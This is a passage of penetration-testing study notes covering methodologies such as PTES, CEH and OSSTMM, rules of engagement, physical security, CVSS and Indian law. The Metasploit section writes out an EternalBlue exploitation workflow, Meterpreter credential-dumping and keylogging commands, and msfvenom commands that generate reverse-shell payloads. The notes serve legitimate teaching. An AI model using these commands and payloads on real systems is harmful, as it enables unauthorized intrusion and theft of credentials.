measuring actual security at the point of interaction.

**Key OSSTMM concepts:**

| Concept | Description |
|---|---|
| **Attack Surface** | All possible points where an attacker could interact |
| **RAV (Risk Assessment Value)** | Quantified security metric — calculated from test results |
| **Operational Security** | Testing actual operational state — not theoretical |
| **Trust** | Measures trust relationships — not just technical controls |

**OSSTMM Channels (what is tested):**

| Channel | Scope |
|---|---|
| **PHYS** | Physical security — facilities, hardware |
| **SPEC** | Spectrum — wireless, radio, infrared |
| **COMM** | Communications — networks, data transfer |
| **DATA** | Data networks — internet, databases |
| **HUMAN** | Social engineering, personnel security |

---

### 4.7 CEH Methodology

**WHAT:**
The CEH (Certified Ethical Hacker) methodology from EC-Council
defines the phases of ethical hacking in a structured sequence
aligned with the CEH certification curriculum.

**CEH Five Phases of Ethical Hacking:**

    PHASE 1 — Reconnaissance (Footprinting)
      Passive: WHOIS, DNS, social media, job postings, Google dorks
      Active: Port scanning, ping sweeps (with authorization)
      Goal: Maximum information with minimum target interaction

    PHASE 2 — Scanning
      Network scanning: Nmap — live hosts, open ports, services
      Vulnerability scanning: Nessus, OpenVAS — known CVEs
      OS fingerprinting: Nmap -O, Xprobe2
      Banner grabbing: Telnet, Netcat, Nmap scripts

    PHASE 3 — Gaining Access (Exploitation)
      Exploit vulnerabilities identified in scanning phase
      Password cracking, exploit frameworks (Metasploit)
      Social engineering, phishing
      Web application exploitation

    PHASE 4 — Maintaining Access
      Install backdoors, Trojans, rootkits
      Establish persistence — survive reboots
      Create additional accounts
      Cover tracks — clear logs

    PHASE 5 — Clearing Tracks (Covering Tracks)
      Delete log files, command history
      Modify timestamps — timestomping
      Remove installed tools and backdoors
      Restore altered files to original state

> [!NOTE]
> CEH methodology is the most commonly referenced in exam
> materials from ACTS/EC-Council context. Know all five phases
> and their sequence. The phases map directly to real-world
> attack sequences covered in Sessions 6–18.

---

### 4.8 Penetration Testing Phases — Unified View

Mapping how sessions in this module map to pentest phases:

| Phase | Session Coverage | Key Tools |
|---|---|---|
| **Reconnaissance** | Session 10 — Footprinting, Social Engineering | WHOIS, Netcraft, Shodan, Google Dorks, Recon-ng |
| **Scanning** | Session 10B — Port/Network/Vulnerability Scanning | NMAP, Nessus, OpenVAS |
| **Enumeration** | Session 11 — Banner Grabbing, OS Fingerprinting | Netcat, Nmap scripts |
| **Vulnerability ID** | Sessions 17A — Web vulnerabilities | Nikto, Burp Suite, Nessus |
| **Exploitation** | Sessions 11–17 — All attack sessions | Metasploit, SQLmap, aircrack-ng |
| **Password Attacks** | Sessions 9, 12A — Password cracking | Hydra, John, Hashcat |
| **Post-Exploitation** | Session 19 — Privilege escalation, persistence | Metasploit post modules |
| **Wireless** | Session 17B — Wireless attacks | Aircrack-ng suite |
| **Web** | Session 17A — Web application attacks | Burp Suite, OWASP ZAP |
| **Physical** | Session 19 — Physical security | Lock picks, RFID cloners |
| **Reporting** | Session 19 — Deliverables | Dradis, Serpico, Word |

---

### 4.9 Rules of Engagement

**WHAT:**
Rules of Engagement (RoE) — also called the Statement of Work
or Test Authorization Letter — is the formal written agreement
between the penetration testing team and the client that defines
all parameters of the engagement.

**Critical RoE components:**

| Component | Detail |
|---|---|
| **Scope** | Specific IP ranges, domains, applications IN scope |
| **Out of scope** | Systems, IPs, third parties explicitly excluded |
| **Testing window** | Dates and times testing is permitted |
| **Authorized techniques** | What attack types are permitted (social engineering? DoS?) |
| **Escalation contacts** | Who to call if critical vulnerability found mid-test |
| **Emergency stop** | Conditions requiring immediate halt to testing |
| **Data handling** | How sensitive data discovered during test is handled |
| **Legal authorization** | Explicit written authorization signed by authorized executive |
| **Third-party notification** | ISP, cloud provider, CDN notification if applicable |
| **Destructive testing** | Explicitly permitted or prohibited |

> [!WARNING]
> Testing ANY system without explicit written authorization in the RoE
> is illegal under IT Act 2000 Section 66 regardless of intent.
> "I thought it was in scope" is not a legal defence.
> When in doubt — STOP and get written clarification before proceeding.

---

### 4.10 Penetration Test Deliverables

**Report structure:**

**1. Executive Summary (2–3 pages):**
- Overall risk rating (Critical/High/Medium/Low)
- Key findings in non-technical language
- Business impact summary
- Top 3 most critical remediation priorities
- Positive findings (what is working well)

**2. Technical Report:**
- Methodology used
- Detailed vulnerability findings:
  - Vulnerability name and CVE (if applicable)
  - CVSS score
  - Affected systems
  - Evidence (screenshots, command output)
  - Business impact
  - Remediation recommendation
  - References

**3. Appendices:**
- Raw scan output (Nmap, Nessus reports)
- Exploit code or PoC (with appropriate handling)
- Timeline of testing activities
- Tools used

**Vulnerability risk ratings:**

| Rating | CVSS Score | Examples |
|---|---|---|
| **Critical** | 9.0–10.0 | Unauthenticated RCE, SQL injection with admin access |
| **High** | 7.0–8.9 | Authenticated RCE, privilege escalation to root |
| **Medium** | 4.0–6.9 | XSS, IDOR, information disclosure |
| **Low** | 0.1–3.9 | Version disclosure, clickjacking |
| **Informational** | 0 | Best practice recommendations |

---

## Section 5 — Metasploit Framework

### 5.1 Metasploit Overview

**WHAT:**
Metasploit Framework is the world's most widely used open-source
penetration testing framework — developed by H.D. Moore in 2003,
acquired by Rapid7 in 2009. It provides a complete suite of tools
for all phases of a penetration test from reconnaissance through
post-exploitation.

**Versions:**

| Version | Access | Features |
|---|---|---|
| **Metasploit Framework** | Free + open source | Full exploit framework — no GUI |
| **Metasploit Community** | Free — limited | Web GUI — basic features |
| **Metasploit Pro** | Commercial | Full GUI, social engineering, reporting |

**Core value:**
Metasploit consolidates thousands of exploit modules, auxiliary
tools, and post-exploitation capabilities into a single consistent
interface — dramatically reducing the expertise required to execute
complex multi-stage attacks.

---

### 5.2 Metasploit Architecture

    Metasploit Framework Components:

    ┌─────────────────────────────────────────────┐
    │           msfconsole (CLI Interface)        │
    ├─────────────────────────────────────────────┤
    │  Modules                                    │
    │  ├── Auxiliary    → Scanning, enumeration   │
    │  ├── Exploits     → Vulnerability exploits  │
    │  ├── Payloads     → Code that runs on target│
    │  │   ├── Singles  → Self-contained          │
    │  │   ├── Stagers  → Setup connection        │
    │  │   └── Stages   → Downloaded by stager    │
    │  ├── Post         → Post-exploitation        │
    │  ├── Encoders     → Payload obfuscation      │
    │  ├── Evasion      → AV evasion modules      │
    │  └── NOPs         → NOP sleds for exploits  │
    ├─────────────────────────────────────────────┤
    │  Libraries                                  │
    │  Rex → Core functions, protocols            │
    │  MSF Core → Framework operations            │
    │  MSF Base → User-facing API                 │
    └─────────────────────────────────────────────┘

**Module types:**

| Module Type | Purpose | Example |
|---|---|---|
| **Auxiliary** | Scanning, enumeration, fuzzing — no payload | `auxiliary/scanner/portscan/tcp` |
| **Exploit** | Attack a vulnerability — delivers payload | `exploit/windows/smb/ms17_010_eternalblue` |
| **Payload** | Code executed on target after exploitation | `windows/x64/meterpreter/reverse_tcp` |
| **Post** | Post-exploitation — escalation, pivoting, harvesting | `post/windows/gather/hashdump` |
| **Encoder** | Obfuscate payload — evade AV | `encoder/x86/shikata_ga_nai` |
| **Evasion** | Generate AV-evading executables | `evasion/windows/applocker_bypass_regsvr32` |
| **NOP** | No-operation sled — buffer overflow padding | `nop/x86/single_byte` |

---

### 5.3 Core Metasploit Commands

**Basic workflow:**

    msfconsole                          ← Launch Metasploit console

    search eternalblue                  ← Search for modules
    use exploit/windows/smb/ms17_010_eternalblue   ← Select module
    info                                ← Show module information
    show options                        ← Show required/optional settings

    set RHOSTS 192.168.1.100           ← Set target IP
    set RPORT 445                       ← Set target port
    set LHOST 192.168.1.50             ← Set local (attacker) IP
    set LPORT 4444                      ← Set listener port
    set PAYLOAD windows/x64/meterpreter/reverse_tcp  ← Set payload

    check                               ← Check if target is vulnerable (if supported)
    run  (or exploit)                   ← Execute the exploit

**Meterpreter post-exploitation commands:**

    sysinfo                             ← Target system information
    getuid                              ← Current user context
    getsystem                           ← Attempt privilege escalation to SYSTEM
    hashdump                            ← Dump password hashes (requires admin)
    ps                                  ← List running processes
    migrate <PID>                       ← Migrate to another process (for stability/stealth)
    screenshot                          ← Capture target screen
    keyscan_start                       ← Start keystroke logging
    keyscan_dump                        ← Retrieve logged keystrokes
    upload /local/file /remote/path     ← Upload file to target
    download /remote/file /local/path   ← Download file from target
    shell                               ← Drop to OS command shell
    run post/windows/gather/hashdump    ← Run post-exploitation module
    background                          ← Background this session
    sessions -l                         ← List all active sessions
    sessions -i 1                       ← Interact with session 1

**Auxiliary scanning:**

    use auxiliary/scanner/smb/smb_ms17_010    ← Scan for EternalBlue vulnerability
    set RHOSTS 192.168.1.0/24
    run

    use auxiliary/scanner/portscan/tcp        ← TCP port scanner
    set RHOSTS 192.168.1.0/24
    set PORTS 22,80,443,445,3389
    run

**Generating standalone payloads with msfvenom:**

    msfvenom -p windows/x64/meterpreter/reverse_tcp \
             LHOST=192.168.1.50 LPORT=4444 \
             -f exe -o payload.exe

    msfvenom -p linux/x64/shell_reverse_tcp \
             LHOST=192.168.1.50 LPORT=4444 \
             -f elf -o payload.elf

    msfvenom -p java/jsp_shell_reverse_tcp \
             LHOST=192.168.1.50 LPORT=4444 \
             -f raw -o shell.jsp

---

### 5.4 Metasploit in Penetration Testing Phases

| Phase | Metasploit Use | Example Module |
|---|---|---|
| **Reconnaissance** | Auxiliary scanners for service discovery | `auxiliary/scanner/smb/smb_version` |
| **Scanning** | Port scanning, vulnerability checking | `auxiliary/scanner/portscan/tcp` |
| **Exploitation** | Exploit verified vulnerabilities | `exploit/windows/smb/ms17_010_eternalblue` |
| **Payload delivery** | Generate shellcode, executables | `msfvenom` |
| **Post-exploitation** | Privilege escalation, lateral movement | `post/multi/recon/local_exploit_suggester` |
| **Persistence** | Install backdoors | `post/windows/manage/persistence` |
| **Data gathering** | Extract credentials, files | `post/windows/gather/credentials` |
| **Pivoting** | Route traffic through compromised host | `route add`, socks proxy |
| **Cleanup** | Remove artifacts | Manual + timestomping modules |

---

## 📌 Extra Notes

### E1 — Physical Penetration Testing

> [!NOTE]
> Physical penetration testing is a formal assessment discipline —
> not unauthorized trespassing. Know the techniques and legal framework.

**WHAT:**
Physical penetration testing is an authorized assessment of an
organization's physical security controls — attempting to bypass
physical barriers, access controls, and security personnel using
the same techniques a real attacker would use.

**Common physical pentest techniques:**

| Technique | Description |
|---|---|
| **Lock picking** | Non-destructive bypass of pin-tumbler and other lock types |
| **Bump key** | Specialized key that bumps pins to shear line via impact |
| **Under-door tool** | Hook inserted under door to pull lever handle from outside |
| **RFID cloning** | Capture proximity card signal — write to blank card |
| **Badge printing** | Create fake access badge resembling organizational style |
| **Tailgating** | Follow employee through secure door without authorization |
| **Dumpster diving** | Retrieve discarded documents and media |
| **Rogue device planting** | Place Raspberry Pi or network tap inside facility |
| **Social engineering** | Impersonate IT support, delivery, contractor |
| **Shoulder surfing** | Observe credentials being entered |

**Physical pentest scope considerations:**
- Time of day (business hours vs after hours)
- Which facilities (HQ, branch offices, data centers)
- Authorized techniques (lock picking? social engineering? impersonation?)
- Evidence requirements (photograph access? physically touch server?)
- Emergency contacts if testing triggers alarms / security response
- Law enforcement notification protocol

---

### E2 — Lock Picking and Physical Bypass

> [!NOTE]
> Lock picking is a legitimate penetration testing skill and a
> security awareness topic — demonstrates why locks alone are insufficient.

**Pin Tumbler Lock mechanism:**

    Pin tumbler lock (most common):
    ├── Plug (rotates when correct key used)
    ├── Housing (stationary)
    ├── Shear line (boundary between plug and housing)
    └── Pin stacks:
        ├── Key pin (bottom) — lifted by key cut
        └── Driver pin (top) — spring-loaded

    Correct key: all key pins lift to shear line simultaneously
    → Plug rotates freely

    Lock picking principle:
    Manufacturing tolerances mean pins engage shear line ONE AT A TIME
    → Apply light rotational pressure (tension wrench)
    → One pin at a time sets at shear line (becomes "binding pin")
    → Use pick to lift each binding pin to shear line
    → After all pins set → lock opens

**Common picking tools:**

| Tool | Use |
|---|---|
| **Tension wrench** | Apply rotational pressure — essential for all picking |
| **Hook pick** | Single pin manipulation — most controlled |
| **Diamond pick** | Rake-style — rakes multiple pins simultaneously |
| **Bogota rake** | Aggressive raking — fast on low-security locks |
| **Bump key** | Impact-based — bumps all pins simultaneously |

**Electronic lock bypass techniques:**
- Default factory codes (never changed by installers)
- Emergency backup key override (most electronic locks have one)
- Power interruption attack (some locks fail open)
- Network attack via Bluetooth/Wi-Fi on smart locks
- Relay attack on RFID (amplify and relay signal)

---

### E3 — Red Team vs Blue Team vs Purple Team

> [!NOTE]
> These terms are frequently tested — know the precise distinctions.

| Team | Role | Focus | Tools |
|---|---|---|---|
| **Red Team** | Offensive — simulate real attacker | Attack, evade detection, reach objectives | Metasploit, Cobalt Strike, custom malware |
| **Blue Team** | Defensive — detect and respond | Monitor, detect, respond, harden | SIEM, IDS, EDR, SOAR |
| **Purple Team** | Collaborative — red and blue together | Improve detection by sharing attack TTPs | Atomic Red Team, MITRE ATT&CK |
| **White Team** | Administration — runs the exercise | Scope, rules, adjudication | Exercise management tools |

**Red Team vs Penetration Test:**

| Property | Penetration Test | Red Team Assessment |
|---|---|---|
| **Goal** | Find as many vulnerabilities as possible | Achieve specific objective (steal data, reach server) |
| **Duration** | Days to weeks | Weeks to months |
| **Stealth** | Stealth optional | Maximum stealth — test detection capability |
| **Scope** | Broad — many systems | Narrow objective — realistic attacker simulation |
| **Blue team notified?** | Yes (usually) | No — tests real detection |
| **Report** | Vulnerability list | Attack narrative + detection gaps |

---

### E4 — CVSSv3 Scoring — Vulnerability Prioritization

> [!NOTE]
> CVSS scores are used in penetration test reports to prioritize
> findings — know the scoring system and metric components.

**CVSS v3.1 Base Score Metrics:**

| Metric Group | Metrics |
|---|---|
| **Exploitability** | Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI) |
| **Impact** | Confidentiality Impact (C), Integrity Impact (I), Availability Impact (A) |
| **Scope** | Whether vulnerability impacts other components (S) |

**Attack Vector values:**

| Value | Description | Score Impact |
|---|---|---|
| **Network (N)** | Exploitable over network | Highest severity |
| **Adjacent (A)** | Exploitable from adjacent network | High |
| **Local (L)** | Requires local access | Medium |
| **Physical (P)** | Requires physical access | Lowest |

**CVSS Score Ranges:**

| Score | Rating |
|---|---|
| 9.0–10.0 | **Critical** |
| 7.0–8.9 | **High** |
| 4.0–6.9 | **Medium** |
| 0.1–3.9 | **Low** |
| 0.0 | **None** |

**CVSSv3 vs CVSSv2:**
CVSSv3 introduced: Scope (S) metric, User Interaction (UI) metric,
split of Access Complexity. CVSSv2 did not have Scope or User
Interaction as separate metrics. Most current tools and reports
use CVSSv3.1.

---

### E5 — Penetration Testing vs Vulnerability Assessment

> [!NOTE]
> This distinction is one of the most commonly tested in MCQs —
> understand the precise technical and scope difference.

| Property | Vulnerability Assessment | Penetration Testing |
|---|---|---|
| **Goal** | Identify all vulnerabilities | Exploit vulnerabilities — prove impact |
| **Exploitation** | ❌ No — identifies only | ✅ Yes — actively exploits |
| **Output** | List of vulnerabilities with severity | Exploited access paths + business impact |
| **Skill required** | Lower — automated tools | Higher — manual exploitation |
| **Tools** | Nessus, OpenVAS, Qualys | Metasploit, Burp Suite + VA tools |
| **Duration** | Hours to days | Days to weeks |
| **False positives** | Higher — automated scanning | Lower — confirmed by exploitation |
| **Business risk** | Lower — no exploitation | Higher — active exploitation |
| **Compliance** | VA often sufficient for compliance | Pentest for higher security maturity |

**Vulnerability Assessment Process:**

    Scan → Identify → Classify → Prioritize → Report

**Penetration Testing Process:**

    Scan → Identify → Verify → Exploit → Post-exploit → Report

**Hybrid: Vulnerability Assessment + Penetration Testing (VA+PT):**
Many organizations run VA first to discover all vulnerabilities,
then run PT to confirm exploitability of the highest-severity findings.
This combines comprehensive coverage (VA) with proof of impact (PT).

---

### E6 — Famous Physical Security Breaches

> [!NOTE]
> Real-world examples reinforce why physical security is critical
> and appear in security awareness and exam contexts.

**Case Study 1 — Target Data Breach (2013) — HVAC Vendor Access:**
- **Attack vector**: Third-party HVAC vendor with remote network access
  to building management systems had weak credentials
- **Physical connection**: Vendor's on-site access + remote credentials
  provided initial network foothold
- **Impact**: 40 million credit card numbers stolen + 70 million PII records
- **Lesson**: Third-party physical and logical access must be controlled
  with the same rigor as internal access — supply chain physical access
  is a major attack vector

**Case Study 2 — NSA TAO Tailored Access Operations — Supply Chain:**
- **Attack vector**: Cisco routers intercepted in transit — firmware
  backdoors implanted — repackaged and delivered to targets
- **Physical connection**: Physical interception during shipping
- **Impact**: Persistent covert access to victim networks
- **Lesson**: Supply chain physical integrity is a national security concern.
  Hardware should be verified upon receipt (tamper-evident seals,
  hash verification of firmware)

**Case Study 3 — Las Vegas Casino High Roller Database (2017):**
- **Attack vector**: Smart thermometer in lobby fish tank had internet
  connectivity — attackers compromised it — pivoted to high-roller database
- **Physical connection**: Networked IoT device inside secure facility
  became initial access point
- **Impact**: High-roller database exfiltrated
- **Lesson**: Any networked device inside a facility is a potential
  physical attack vector — IoT device management and network
  segmentation are critical

---

### E7 — Predecessor / Successor Chains

> [!NOTE]
> Understanding how penetration testing and physical security
> controls evolved provides examination context.

**Penetration Testing Evolution:**

    Early ethical hacking — informal, ad-hoc (1980s–1990s)
            ↓
    Tiger teams — US military-sponsored internal red teams (1970s–1990s)
            ↓
    Commercial penetration testing firms emerge (1990s)
            ↓
    First methodologies published — OSSTMM (2000), NIST SP 800-42 (2003)
            ↓
    CEH certification launched — EC-Council (2003)
            ↓
    PTES published — community-developed standard (2010)
            ↓
    Bug bounty programs — HackerOne, Bugcrowd (2012+)
            ↓
    Red team assessments become mainstream (2014+)
            ↓
    Purple teaming — collaborative offensive/defensive (2016+)
            ↓
    AI-assisted pentesting — automated vulnerability chaining (2023+)
            ↓
    Continuous pentesting / Pentest-as-a-Service (PTaaS) (2024+)

**Physical Security Evolution:**

    Guards + locks + fences (ancient)
            ↓
    Alarm systems — electronic (1850s — telegraph-based)
            ↓
    CCTV — closed-circuit television (1942 — Germany V2 rocket launches)
            ↓
    Electronic access control — magnetic stripe (1960s)
            ↓
    Proximity cards — RFID (1970s)
            ↓
    Biometric access control (1980s–1990s)
            ↓
    IP-based CCTV — networked cameras (2000s)
            ↓
    AI-powered video analytics — facial recognition (2010s)
            ↓
    Zero Trust Physical Access — identity + context + device (2020+)
            ↓
    Autonomous security robots — patrol, detection (2022+)

---

### E8 — Terminology Traps

| Term | Trap | Clarification |
|---|---|---|
| **Tailgating vs Piggybacking** | "Both are the same attack" | TAILGATING: victim unaware. PIGGYBACKING: victim knowingly (coerced/politely) allows entry. Different social dynamics — same technical outcome. |
| **Black/White/Grey box = scope** | "Black box is a limited-scope test" | These refer to INFORMATION provided — not scope. Scope (which systems) is a separate parameter from information (what prior knowledge tester has). |
| **Pentest = vulnerability assessment** | "Both find vulnerabilities" | VA identifies. Pentest EXPLOITS. VA stops at finding — pentest proves real-world impact through exploitation. |
| **PTES is the only methodology** | "PTES is the standard methodology" | Multiple methodologies exist: PTES, OWASP OTG, NIST 800-115, OSSTMM, CEH methodology, ISSAF. All are valid — exam may reference any. |
| **Metasploit is illegal to use** | "Using Metasploit is hacking" | Metasploit is a legitimate, open-source security research and testing tool. Use is legal with written authorization. It is included in Kali Linux — the standard penetration testing distribution. |
| **Physical security is only about locks** | "Lock the doors = physical security done" | Physical security is multi-layered: barriers + access control + CCTV + guards + environmental + lighting + procedures + awareness. Locks alone are easily bypassed. |
| **CVSS score = actual risk** | "CVSS 9.0 = must fix first" | CVSS Base Score measures technical severity — not business risk. A CVSS 9.0 on an air-gapped lab server may be lower priority than a CVSS 5.0 on an internet-facing payment server. Business context always modifies CVSS priority. |
| **Red team = penetration test** | "We hired a red team for a pentest" | Red team assessments are objective-based (reach specific target) with maximum stealth over long duration. Penetration tests are vulnerability-discovery-based with broader scope in shorter time. Different goals and methods. |
| **Reconnaissance = only passive** | "Recon doesn't touch the target" | Reconnaissance includes both PASSIVE (OSINT — no target contact) and ACTIVE (port scanning, enumeration — requires authorization). Active recon IS interaction with target systems. |
| **Ethical hacker has no legal liability** | "Authorization protects from all liability" | Authorization protects within scope only. Actions outside defined scope remain criminal. Data discovered during testing (passwords, PII) must be handled per agreement — disclosure of such data creates separate liability. |

---

### E9 — Current Landscape 2026

> [!NOTE]
> Current state of physical security and penetration testing in 2025–2026.

**AI-Powered Physical Security (2024–2026):**
- **AI video analytics**: Real-time behavioral analysis — detecting
  tailgating, loitering, abandoned packages, unauthorized persons
  in restricted areas — without relying on human CCTV monitoring
- **Facial recognition at scale**: Airport-style facial recognition
  deployed at enterprise data centers — 1:N matching against
  authorized personnel database. Raises privacy concerns vs
  DPDPA 2023 biometric data requirements
- **Autonomous security robots**: Boston Dynamics Spot and similar
  robots deployed for facility patrol — thermal imaging, CCTV
  on mobile platform, anomaly detection. Limitations: stairs,
  weather, social manipulation

**Penetration Testing Trends (2025–2026):**
- **PTaaS (Pentest-as-a-Service)**: Continuous automated +
  manual penetration testing on subscription — platforms like
  Synack, Cobalt, Bugcrowd provide ongoing assessment rather
  than point-in-time tests. Regulatory trend toward continuous
  assessment over annual pentests
- **AI-assisted exploitation**: LLM-based tools generate attack
  chains by correlating discovered vulnerabilities — automated
  privilege escalation path finding, automated report generation
- **Cloud pentesting maturity**: AWS/Azure/GCP penetration testing
  guidance has matured — specific RoE for cloud engagements
  (no denial-of-service testing of shared infrastructure,
  notification requirements before testing cloud services)
- **Supply chain security assessments**: Post-SolarWinds, post-Log4j,
  organizations increasingly include software supply chain
  assessment as pentest scope — SBOM (Software Bill of Materials)
  analysis integrated into engagements

**Physical Security Technology (2025–2026):**
- **ZTNA (Zero Trust Network Access)** extending to physical:
  context-aware access control — physical door access requires
  valid device posture, current user authentication session,
  and risk score — not just badge presentation
- **Deepfake risk to biometrics**: AI-generated face images
  (GAN/diffusion model) defeat 2D facial recognition — liveness
  detection arms race continues. Voice deepfakes defeat voice
  authentication — out-of-band verification required
- **Quantum-safe RFID**: Research into post-quantum cryptography
  for smart card access control — anticipating future quantum
  computing threat to current ECC-based smart cards

---

### E10 — Indian Legal Context

> [!NOTE]
> Indian law applicable to penetration testing and physical security.

**Penetration Testing Authorization:**

| Law | Section | Relevance |
|---|---|---|
| **IT Act 2000** | **S.66** | Testing without written authorization = criminal hacking — up to 3 years + ₹5 lakh |
| **IT Act 2000** | **S.43(a)** | Unauthorized access — civil ₹1 crore — applies even with good intent |
| **IT Act 2000** | **S.43(g)** | Destroying or altering data during unauthorized test — civil ₹1 crore |
| **Indian Contract Act 1872** | — | Penetration test agreement = service contract — enforceable under contract law |
| **IT Act 2000** | **S.72** | Tester who discloses client data discovered during authorized test — breach of confidentiality — 2 years + ₹1 lakh |

**Physical Security and Law:**

| Law | Section | Relevance |
|---|---|---|
| **IPC** | **S.441** | Criminal trespass — entering property without authorization — up to 3 months + fine |
| **IPC** | **S.447** | Punishment for criminal trespass — up to 3 months or ₹500 fine |
| **IPC** | **S.457** | Lurking house trespass at night — up to 2 years |
| **IPC** | **S.380** | Theft in dwelling — stealing hardware from premises — up to 7 years |
| **IPC** | **S.426** | Mischief — intentional damage to property (servers, hardware) — up to 3 months |
| **IT Act 2000** | **S.66F** | Physical attack on critical infrastructure (power, water, banking data centers) — life imprisonment |
| **DPDPA 2023** | — | Physical breach exposing personal data triggers breach notification obligations |

> [!IMPORTANT]
> For penetration testing to be legal in India:
> 1. **Written authorization** from the legitimate system/property owner
> 2. **Defined scope** — tested systems/premises explicitly listed
> 3. **Defined timeframe** — testing only within authorized windows
> 4. **Non-disclosure agreement** — tester cannot disclose findings
> 5. **Data handling agreement** — any sensitive data discovered handled per agreement
>
> Physical penetration testing additionally requires:
> - Authorization letter from property owner
> - Coordination with local law enforcement (recommended)
> - Clear identification process if security/police encounter occurs
> - Immediate stop-test protocol if real emergency occurs

---

## Abbreviations Table

| Abbreviation | Full Form | One-Line Technical Meaning |
|---|---|---|
| **ASHRAE** | American Society of Heating, Refrigerating and Air-Conditioning Engineers | Standards body — data center environmental guidelines |
| **BAS** | Building Automation System | Integrated control of HVAC, lighting, access — attack target |
| **CCTV** | Closed-Circuit Television | Video surveillance — detective + deterrent control |
| **CEH** | Certified Ethical Hacker | EC-Council certification — defines 5-phase hacking methodology |
| **CPT** | Certified Penetration Tester | Professional penetration testing certification |
| **CVSS** | Common Vulnerability Scoring System | 0–10 numerical severity score for vulnerabilities |
| **DMZ** | Demilitarized Zone | Physical or network neutral zone between secure areas |
| **EER** | Equal Error Rate | Biometric threshold where FAR = FRR |
| **EMP** | Electromagnetic Pulse | Physical attack — destroys unshielded electronics |
| **FAR** | False Accept Rate | Biometric — unauthorized person incorrectly accepted |
| **FRR** | False Reject Rate | Biometric — authorized person incorrectly rejected |
| **HVAC** | Heating, Ventilation, and Air Conditioning | Environmental control — data center cooling |
| **ISECOM** | Institute for Security and Open Methodologies | Publishes OSSTMM |
| **ISSAF** | Information Systems Security Assessment Framework | Comprehensive security assessment methodology |
| **LOA** | Letter of Authorization | Written permission for penetration testing |
| **NIST** | National Institute of Standards and Technology | US standards body — publishes SP 800-115 |
| **NOP** | No-Operation | Assembly instruction — used in exploit NOP sleds |
| **OSCP** | Offensive Security Certified Professional | Offensive Security hands-on pentest certification |
| **OSINT** | Open Source Intelligence | Intelligence from publicly available sources |
| **OSSTMM** | Open Source Security Testing Methodology Manual | ISECOM comprehensive security testing methodology |
| **OTG** | OWASP Testing Guide | OWASP web application security testing methodology |
| **OWASP** | Open Web Application Security Project | Non-profit — web security resources including OTG |
| **PIR** | Passive Infrared | Motion sensor type detecting body heat |
| **PoC** | Proof of Concept | Demonstration code proving vulnerability is exploitable |
| **PTES** | Penetration Testing Execution Standard | Community-standard 7-phase pentest methodology |
| **PTaaS** | Pentest-as-a-Service | Continuous penetration testing on subscription |
| **RAV** | Risk Assessment Value | OSSTMM quantified security measurement |
| **RFID** | Radio Frequency Identification | Contactless card technology — proximity access cards |
| **RoE** | Rules of Engagement | Formal agreement defining pentest scope and constraints |
| **SBOM** | Software Bill of Materials | List of all software components in a system |
| **SOW** | Statement of Work | Contract defining pentest deliverables and timeline |
| **SP** | Special Publication | NIST document series — SP 800-115 for security testing |
| **TTL** | Time to Live | IP packet field — manipulated in IDS evasion |
| **TTP** | Tactics, Techniques, and Procedures | Attacker behavior patterns — MITRE ATT&CK framework |
| **UPS** | Uninterruptible Power Supply | Battery backup for power continuity |
| **ZTNA** | Zero Trust Network Access | Identity-verified, context-aware access control |

---

## 🔑 Keywords + Concept Map

**Core Keywords:**

`Physical Security` · `Defense in Depth` · `Tailgating` · `Piggybacking` ·
`Mantrap` · `CCTV` · `RFID` · `Access Control` · `Biometric` · `Bollard` ·
`Dumpster Diving` · `Shoulder Surfing` · `Baiting` · `Social Engineering` ·
`Environmental Controls` · `UPS` · `HVAC` · `FM-200` · `Penetration Testing` ·
`Black Box` · `White Box` · `Grey Box` · `PTES` · `CEH Methodology` ·
`NIST SP 800-115` · `OSSTMM` · `OWASP OTG` · `Rules of Engagement` ·
`Letter of Authorization` · `Scope` · `Reconnaissance` · `Exploitation` ·
`Post-Exploitation` · `Reporting` · `CVSS` · `Red Team` · `Blue Team` ·
`Purple Team` · `Metasploit` · `msfconsole` · `msfvenom` · `Meterpreter` ·
`Auxiliary Module` · `Exploit Module` · `Payload` · `Post Module` ·
`Vulnerability Assessment` · `Lock Picking` · `T1200`

---

**Concept Map:**

    PHYSICAL SECURITY + PENETRATION TESTING
    │
    ├── PHYSICAL SECURITY
    │   ├── Why It Matters
    │   │   └── Physical access = bypass all software controls
    │   ├── CIA Impact
    │   │   ├── Confidentiality → shoulder surfing, theft, dumpster diving
    │   │   ├── Integrity → hardware tampering, firmware implants
    │   │   └── Availability → destruction, power disruption
    │   ├── Defense Layers
    │   │   ├── Perimeter → fences, bollards, gates
    │   │   ├── Building → reinforced doors, reception, mantraps
    │   │   ├── Zone → card readers, escort policy
    │   │   ├── Secure Area → biometric + card + PIN
    │   │   └── Asset → cable locks, encryption, tamper seals
    │   ├── Controls
    │   │   ├── Barriers → fences, bollards, mantraps, turnstiles
    │   │   ├── Access Control → keys, RFID, smart card, biometric
    │   │   ├── Surveillance → CCTV (detective+deterrent), motion sensors
    │   │   ├── Personnel → guards, reception, SOC
    │   │   ├── Environmental → HVAC, UPS, fire suppression (FM-200)
    │   │   └── Lighting → deterrence + CCTV effectiveness
    │   └── Attacks
    │       ├── Tailgating / Piggybacking → mantrap countermeasure
    │       ├── RFID cloning → cryptographic smart card countermeasure
    │       ├── Dumpster diving → shredding policy
    │       ├── Shoulder surfing → privacy screens, positioning
    │       └── Baiting (USB drop) → disable autorun, awareness
    │
    └── PENETRATION TESTING
        ├── Types
        │   ├── By info: Black / White / Grey box
        │   ├── By target: Network / Web / Wireless / Social / Physical
        │   └── By approach: External / Internal / Assumed breach
        ├── Methodologies
        │   ├── PTES → 7 phases (Pre-engagement → Reporting)
        │   ├── CEH → 5 phases (Recon → Clearing tracks)
        │   ├── NIST SP 800-115 → 4 phases
        │   ├── OWASP OTG → Web application specific
        │   └── OSSTMM → 5 channels (PHYS/SPEC/COMM/DATA/HUMAN)
        ├── Process
        │   ├── Authorization → Written RoE mandatory
        │   ├── Reconnaissance → OSINT + active scanning
        │   ├── Scanning → Nmap, Nessus, OpenVAS
        │   ├── Exploitation → Metasploit, Burp, sqlmap
        │   ├── Post-exploitation → Meterpreter, privilege escalation
        │   └── Reporting → Executive + Technical + CVSS ratings
        ├── Metasploit
        │   ├── Modules: Auxiliary | Exploit | Payload | Post | Encoder
        │   ├── msfconsole → search / use / set / run
        │   ├── Meterpreter → post-exploitation shell
        │   └── msfvenom → standalone payload generation
        └── Comparisons
            ├── Pentest vs VA → exploit vs identify
            └── Red team vs Pentest → objective vs vulnerability list

---

## ⚡ Quick Reference Cheatsheet

### 🏛️ Physical Security Controls

| Control | Type | Defeats | Limitation |
|---|---|---|---|
